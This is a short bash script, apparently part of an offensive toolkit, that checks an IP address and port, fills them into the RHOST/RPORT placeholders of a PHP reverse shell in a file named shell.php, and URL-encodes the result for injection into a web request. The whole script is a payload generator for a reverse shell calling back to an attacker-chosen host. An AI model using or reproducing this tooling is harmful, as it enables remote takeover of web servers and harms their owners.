#!/bin/bash

usage () {
    echo "Usage: $0 <ipaddress> <port>";
}

if [ $# -ne 2 ]; then
    usage;
    exit 1;
fi

echo -n "${1}" | egrep -q '^([1-9][0-9]{0,2}[.]){3}[0-9]{1,3}$'
if [ 0 -ne $? ]; then
    echo "Error: ipaddress malformed" >&2;
    usage;
    exit 1
fi

#if ! [[ "${2}" =~ '^[0-9]+$' ]]; then
echo -n "${2}" | egrep -q '^[0-9]+$'
if [ 0 -eq $? ]; then
    if ! [ "${2}" -ge 1 -a "${2}" -le 65535 ]; then
        echo "Error: port should be a number between 1 and 65535" >&2;
        usage;
        exit 1
    fi
else
    echo "Error: port should be a number" >&2;
    usage;
    exit 1
fi

RHOST="${1}"
RPORT="${2}"

source ./url_encode_decode.sh

urlencode "$(cat shell.php | sed "s/#RHOST#/$RHOST/g" | sed "s/#RPORT#/$RPORT/g" | tr -d '\n' | tr "'" "\"" | sed 's/\s\+/ /g')"
